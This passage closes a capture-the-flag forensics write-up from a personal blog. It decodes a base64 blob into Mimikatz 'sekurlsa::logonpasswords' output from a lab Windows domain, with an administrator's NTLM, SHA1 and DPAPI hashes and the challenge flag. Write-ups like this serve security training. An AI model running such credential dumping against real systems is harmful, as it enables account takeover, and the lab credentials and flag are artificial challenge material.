qIFBhc3N3b3JkIDogKG51bGwpCglrZXJiZXJvcyA6CQoJICogVXNlcm5hbWUgOiBTYXRBZG1pbmlzdHJhdG9yCgkgKiBEb21haW4gICA6IENPUlAuTE9DQUwKCSAqIFBhc3N3b3JkIDogKG51bGwpCglzc3AgOgkKCWNyZWRtYW4gOgkKCSBbMDAwMDAwMDBdCgkgKiBVc2VybmFtZSA6IEFkbWluaXN0cmF0b3IKCSAqIERvbWFpbiAgIDogY29ycC1kYwoJICogUGFzc3dvcmQgOiBIVEJ7dGgzXzNtcDFyM19GMW40bGx5X0MwbGw0cHMzZH0KCWNsb3VkYXAgOgkKCkF1dGhlbnRpY2F0aW9uIElkIDogMCA7IDk5NyAoMDAwMDAwMDA6MDAwMDAzZTUpClNlc3Npb24gICAgICAgICAgIDogU2VydmljZSBmcm9tIDAKVXNlciBOYW1lICAgICAgICAgOiBMT0NBTCBTRVJWSUNFCkRvbWFpbiAgICAgICAgICAgIDogTlQgQVVUSE9SSVRZCkxvZ29uIFNlcnZlciAgICAgIDogKG51bGwpCkxvZ29uIFRpbWUgICAgICAgIDogOC8zMC8yMDIyIDEyOjMzOjE3IFBNClNJRCAgICAgICAgICAgICAgIDogUy0xLTUtMTkKCW1zdiA6CQoJdHNwa2cgOgkKCXdkaWdlc3QgOgkKCSAqIFVzZXJuYW1lIDogKG51bGwpCgkgKiBEb21haW4gICA6IChudWxsKQoJICogUGFzc3dvcmQgOiAobnVsbCkKCWtlcmJlcm9zIDoJCgkgKiBVc2VybmFtZSA6IChudWxsKQoJICogRG9tYWluICAgOiAob -- more bytes --</span>
</span></span></code></pre></div><p>Decoding the huge b64 blob, we get the flag:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#e6db74">&#39;Hostname: satellite-2341.CORP.local / S-1-5-21-288640240-4143160774-4193478011</span><span style="color:#ae81ff">\r\n\n</span><span style="color:#e6db74">  .#####.   mimikatz 2.2.0 (x64) #19041 Nov 20 2021 08:28:06</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74"> .## ^ ##.  &#34;A La Vie, A L</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">Amour&#34; - (oe.eo)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74"> ## / </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74"> ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74"> ## </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74"> / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74"> </span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">## v ##</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">  </span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">#####</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">mimikatz(powershell) # sekurlsa::logonpasswords</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">Authentication Id : 0 ; 332550 (00000000:00051306)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Session           : Interactive from 1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">User Name         : SatAdministrator</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Domain            : CORP</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Logon Server      : CORP-DC</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Logon Time        : 8/30/2022 12:33:30 PM</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">SID               : S-1-5-21-288640240-4143160774-4193478011-1114</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74">msv :</span><span style="color:#ae81ff">\t\n\t</span><span style="color:#e6db74"> [00000003] Primary</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74"> * Username : SatAdministrator</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74"> * Domain   : CORP</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74"> * NTLM     : a9fdfa038c4b75ebc76dc855dd74f0da</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74"> * SHA1     : 9400ae28448e1364174dde269b2cce1bca9d7ee8</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74"> * DPAPI    : fd11ad3dc4333190109c15db931a3b4a</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74">tspkg :</span><span style="color:#ae81ff">\t\n\t</span><span style="color:#e6db74">wdigest :</span><span style="color:#ae81ff">\t\n\t</span><span style="color:#e6db74"> * Username : SatAdministrator</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74"> * Domain   : CORP</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74"> * Password : (null)</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74">kerberos :</span><span style="color:#ae81ff">\t\n\t</span><span style="color:#e6db74"> * Username : SatAdministrator</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74"> * Domain   : CORP.LOCAL</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74"> * Password : (null)</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74">ssp :</span><span style="color:#ae81ff">\t\n\t</span><span style="color:#e6db74">credman :</span><span style="color:#ae81ff">\t\n\t</span><span style="color:#e6db74"> [00000000]</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74"> * Username : Administrator</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74"> * Domain   : corp-dc</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74"> * Password : [REDACTED_FLAG]</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74">cloudap :</span><span style="color:#ae81ff">\t\n</span><span style="color:#e6db74">&#39;</span>
</span></span></code></pre></div><p>This is it for this training session.</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
<nav class="paginav">
  <a class="prev" href="https://connar.github.io/ctfwriteups/chinesewindowsupgrader/">
    <span class="title">« Prev</span>
    <br>
    <span>Chinese Windows Updater - Writeup</span>
  </a>
  <a class="next" href="https://connar.github.io/ctfwriteups/flagontherun/">
    <span class="title">Next »</span>
    <br>
    <span>Flag on the run - Writeup</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="https://connar.github.io/">Journal of Connar</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
